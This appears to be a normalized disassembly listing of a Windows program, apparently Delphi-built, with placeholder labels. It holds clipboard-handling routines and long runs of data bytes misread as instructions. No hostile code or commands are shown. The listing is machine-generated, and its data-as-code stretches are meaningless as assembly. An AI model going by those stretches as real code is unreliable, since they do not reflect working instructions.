test [ ebp - 0x1 ] 0x8
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x174 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_428a68
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_4283ac
sub al 0x2
jne r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_4288e4
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x190 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x1ac ] eax
cmp [ ebx + 0x1a8 ] 0x2
jne r-xdata
mov eax ebx
call sub_4283ac
sub al 0x2
jne r-xdata
sub_428bfc
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_4364d0
cmp [ esi + 0x174 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn 0x8
mov al [ esi + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax esi
call sub_4283ac
sub al 0x2
jne r-xdata
mov eax esi
call sub_4288e4
mov eax esi
mov si 0xffc7
call sub_403324
sub_428c50
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ ecx ] 0x1b
jne r-xdata
cmp [ esi + 0x19a ] 0x0
je r-xdata
mov eax esi
mov si 0xffc7
call sub_403324
jmp r-xdata
pop esi
pop ebp
retn 0x4
mov al [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x19c ]
call [ esi + 0x198 ]
sub_428c98
push ebx
mov ebx eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
cmp [ ebx + 0x1ba ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
xor eax eax
mov [ ebx + 0x174 ] eax
mov eax ebx
call sub_428418
mov eax [ ebx + 0x168 ]
test eax eax
je r-xdata
mov eax ebx
call sub_4283ac
mov edx [ ebx + 0x198 ]
mov [ eax + 0x1d8 ] edx
mov edx [ ebx + 0x19c ]
mov [ eax + 0x1dc ] edx
xor eax eax
mov [ ebx + 0x168 ] eax
sub_428d08
mov [ fs : esi ] 0x27
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
mov [ fs : esi ] 0x2d
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ esi ] ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
mov [ fs : esi ] 0x15
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ esi ] dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
mov [ fs : esi ] 0x1d
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ esi ] bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
mov [ fs : esi ] 0x5
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ esi ] al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
mov [ fs : esi ] 0xd
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ esi ] cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add al dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ch dh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ ecx + ebp * 4 + 0x46 ] dl
add [ eax - 0x72 ] bh
inc edx
add [ ecx + ebp * 4 + 0x46 ] cl
add [ eax - 0x72 ] dh
inc edx
add [ ecx + ebp * 4 + 0x46 ] al
add [ eax - 0x72 ] ch
inc edx
add [ ecx + ebp * 4 ] bh
inc esi
add [ eax - 0x72 ] ah
inc edx
add [ ecx + ebp * 4 ] dh
inc esi
add [ eax - 0x72 ] bl
inc edx
add [ ecx + ebp * 4 ] ch
inc esi
add [ eax - 0x72 ] dl
inc edx
add [ ecx + ebp * 4 ] ah
inc esi
add [ eax - 0x72 ] cl
inc edx
add [ ecx + ebp * 4 ] bl
inc esi
add [ eax - 0x72 ] al
inc edx
add [ ecx + ebp * 4 ] dl
inc esi
add [ eax ] bh
mov es [ edx ]
or al 0xa9
inc esi
add [ eax ] dh
mov es [ edx ]
add al 0xa9
inc esi
add [ eax ] ch
mov es [ edx ]
cld
test al 0x46
add [ eax ] ah
mov es [ edx ]
hlt
sub_429074
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429099
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4290a0
retn
sub_4290b0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x91
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 4 ] dl
inc edx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x16 ] ah
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x48004296 ] al
xchg esp eax
inc edx
add [ eax + 0x3f ] ah
inc ecx
add [ eax + 0x2c004295 ] bh
xchg edx eax
inc edx
add [ ecx + edx * 4 + 0x42 ] al
add [ ecx + edx * 4 - 0x6e2fffbe ] ah
inc edx
add [ edx ] cl
push esp
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
pop ecx
pop ebp
retn
nop
and al 0x91
inc edx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6c ]
imul esi [ eax + 0x62 ] 0x6472616f
clc
nop
inc edx
add ah dl
push ss
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42917c
push [ fs : eax ]
mov [ fs : eax ] esp
call EmptyClipboard
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4291a4
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call CloseClipboard
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
call sub_41a470
sub_4291d0
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebx + 0x4 ]
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
call OpenClipboard
test eax eax
jne r-xdata
push ebx
push sub_429624
call sub_41a3bc
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x1
mov [ ebx + 0xd ] 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
sub_42922c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x8 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42924c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
push 0x1
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4292be
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_403e78
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov edx eax
mov eax ebx
call sub_404070
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4292c5
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_4292cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_42936e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_41f23c
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
movzx eax bx
push eax
call GetClipboardData
mov esi eax
push 0x9
call GetClipboardData
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41f14c
call sub_403960
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42937c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4293d4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
mov esi eax
push esi
mov ecx ebx
mov dx 0x2
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4293db
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4293e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_429439
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x3
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
push eax
mov ecx ebx
mov dx 0x3
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429440
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_429448
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4292cc
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_42937c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_413f58
mov edx ebx
mov eax esi
call sub_4293e4
jmp r-xdata
pop esi
pop ebx
retn
sub_4294b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_429525
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_429188
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
call sub_41f210
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42952c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_429534
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4295a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_429188
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4295b0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_4295b8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4294b0
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_413e74
mov edx ebx
mov eax esi
call sub_429534
jmp r-xdata
pop esi
pop ebx
retn
sub_429624
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42964e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429653
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_4038dc
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_403930
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429680
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e48
test bl bl
jle r-xdata
xor eax eax
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_4296b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4296e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4296ec
retn
mov eax [ rw-data ]
call sub_403128
sub_429780
test [ edi + 0xd030042 ] dl
push esp
inc edx
jne r-xdata
add [ eax ] al
je r-xdata
scasd [ edi ]
inc edx
add [ eax + 0x3a ] bh
inc ebx
add al bh
scasd [ edi ]
inc edx
add [ eax - 0xfffbbef ] bl
cmp eax [ ebx ]
lodsb [ esi ]
cmp al [ ebx ]
aam 0x11
inc esp
add al ch
adc [ eax + eax - 0x1c ] eax
cmp al [ ebx ]
adc [ edx ] dl
inc esp
add [ eax + 0x3b ] al
inc ebx
add [ eax ] ch
mov al 0x42
add [ eax + 0x3b ] ah
inc ebx
add [ eax - 0x50 ] cl
inc edx
add [ esp + edi + 0x43 ] dh
add [ esp + edi + 0x43 ] dl
add [ esp + edi + 0x3b800043 ] dl
inc ebx
add [ edx + edx ] dh
inc esp
add [ eax ] bh
adc al [ eax + eax - 0x5c ]
cmp eax [ ebx ]
adc al 0x39
inc ebx
add [ esi ] dl
push esp
push ebx
jo r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah cl
0xaf880041 0x42
add [ ebx + 0x3b180041 ] bl
inc ebx
add [ ebx + ebx * 4 ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
inc ebx
add [ esi + edi + 0x41 ] dh
add ah bh
mov ch 0x42
add [ eax + eax * 2 + 0x3ff00043 ] al
inc ebx
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ eax + 0x240042 ] 0x0
add al bl
cli
jne r-xdata
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xb0680041 0x42
sub al 0x5b
inc ebx
add [ eax ] ch
pop ebx
inc ebx
add al bh
pop ebx
inc ebx
add al bh
inc ebx
add [ esi + eax * 2 ] bh
inc ebx
add [ eax - 0x37ffbcbb ] ah
dec esi
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ eax ] ch
pop esi
inc ebx
add ah ah
outsb
inc ebx
add [ eax - 0xfffbcb0 ] cl
push eax
inc ebx
add [ eax + 0x41 ] dh
inc ebx
add ah bl
push eax
inc ebx
add [ eax - 0x4f ] ah
inc edx
add [ eax ] dl
add [ ebx ] al
add cl [ eax + esi * 4 ]
sbb [ eax - 0x4ff14ffa ] dh
adc dh [ eax - 0x4fec4fdc ]
adc al 0xb0
out dx eax
inc ebx
add al bh
cdq
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0xb004297 ] al
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x42992490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
0x42 0x0
add [ eax ] al
add [ eax ] al
mov ah 0x99
inc edx
add [ esi ] dl
0x1840042 0x0
cmp [ eax ] dl
inc ebx
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ ebx + esi + 0x5fbc0040 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] ch
mov cl 0x42
add [ esp + ebp * 2 + 0x60940043 ] bl
add al al
cwde
inc edx
add [ eax + eax ] ah
add [ eax ] al
fdivr st2
push 0x7466654c
or al 0x62
insb
inc edi
insb
jns r-xdata
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
push 0x68676952
je r-xdata
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add ah bl
xor [ eax ] al
int3
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
jns r-xdata
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
inc ecx
add ah al
cmp eax [ ebx ]
test [ edx - 0x64e7ffbf ] bl
inc ecx
add [ eax ] bl
cmp eax [ ebx ]
xor al 0x9b
je r-xdata
add [ eax ] al
fwait
outsb
jae r-xdata
adc [ eax + 0x74 ] ch
xchg edi eax
inc edx
add bl al
jmp sub_40387c
shl al 0x97
inc edx
add [ ecx ] al
or dl [ esi + ecx * 2 + 0x75 ]
insd
inc edi
insb
jns r-xdata
inc ecx
add [ ebx + ebx * 4 + 0x41 ] ch
add [ edx + edi ] al
inc ebx
add [ edi + ebp * 4 + 0x3a780042 ] ch
inc ecx
add [ eax ] bl
fwait
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
inc esp
cwde
inc edx
sub_429f9c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_441bec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_429ff0
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_441c40
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_42a020
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_413dd0
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_413d8c
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_442074
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_413ce8
sub_42a06c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42a020
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_442280
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42a098
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_413db8
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_413d8c
sub_42a0c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_42a10c
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_42a13c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_429f9c
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41375c
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4138b8
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42a19c
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_4139fc
mov eax ebx
call sub_403128
sub_42a1cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42a300
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_40344c
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a0c8
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_42a260
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403128
mov eax esi
call sub_42a2bc
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_42a1c0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
mov eax [ rw-data ]
call sub_403128
xor eax eax
mov [ rw-data ] eax
sub_42a2bc
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_42a098
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_42a19c
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_42a300
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_421720
mov [ ebx + 0x1c ] eax
